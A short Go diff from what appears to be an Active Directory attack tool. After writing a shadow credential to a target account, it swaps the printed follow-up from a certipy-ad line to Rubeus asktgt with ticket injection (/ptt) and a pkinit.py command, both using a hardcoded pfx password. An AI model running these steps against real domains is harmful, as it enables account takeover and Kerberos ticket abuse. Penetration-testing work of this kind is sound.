@@ -192,9 +192,9 @@ func AddShadowCredentialWithEntry(cfg *ADCSConfig, targetDN string, entry *KeyCr
 	if err2 == nil && len(dn.RDNs) > 0 && len(dn.RDNs[0].Attributes) > 0 {
 		targetName = dn.RDNs[0].Attributes[0].Value
 	}
-	fmt.Println("[*] Next: use the private key for PKINIT authentication")
 	fmt.Println("[*] Next: PKINIT authentication with the shadow credential key")
-	fmt.Printf("    certipy-ad auth -pfx %s.pfx -dc-ip <DC_IP> -domain %s\n", targetName, cfg.Domain)
+	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s.pfx /password:password /ptt\n", targetName, targetName)
+	fmt.Printf("    KRB5CCNAME=%s.ccache python3 /opt/impacket/examples/pkinit.py %s@%s -cert-pfx %s.pfx -pfx-pass password\n", targetName, targetName, cfg.Domain, targetName)
 
 	return entry, nil
 }
